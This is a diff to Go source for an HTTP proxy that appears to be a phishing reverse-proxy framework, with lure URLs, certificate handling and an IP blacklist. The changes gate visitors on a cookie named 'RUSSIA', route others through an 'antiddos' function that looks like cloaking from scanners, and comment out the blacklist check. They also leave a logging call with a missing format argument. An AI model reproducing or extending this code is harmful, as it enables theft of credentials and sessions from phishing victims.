@@ -158,16 +158,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			log.Warning("REQ QUERY TOP: %s", req.URL)
+			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 
 			msg, err := req.Cookie("RUSSIA")
 
 			if err != nil {
 				log.Error("msg: %v", err)
-				return p.antiddos(req, ps, goDotEnvVariable("LINK_URL"), "USA")
+				return p.antiddos(req, ps, req_url, "USA")
 
 			} else {
 				if !p.isForwarderUrlBy2(req) {
-					return p.antiddos(req, ps, goDotEnvVariable("LINK_URL"), "USAt")
+					return p.antiddos(req, ps, req_url, "USAt")
 				}
 				log.Important(msg.Value)
 			}
@@ -177,10 +178,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
 			}
-			if p.bl.IsBlacklisted(from_ip) {
-				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-				return p.blockRequest(req)
-			}
+			//if p.bl.IsBlacklisted(from_ip) {
+			//	log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+			//	return p.blockRequest(req)
+			//}
 			if p.cfg.GetBlacklistMode() == "all" {
 				err := p.bl.AddIP(from_ip)
 				if err != nil {
@@ -192,8 +193,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return p.blockRequest(req)
 			}
 
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			log.Warning("REQ_URL: %s", req_url)
+			log.Warning("REQ_URL: %s")
 			log.Warning("REQ URL PATH: %s", req.URL.Path)
 			lure_url := req_url
 			req_path := req.URL.Path
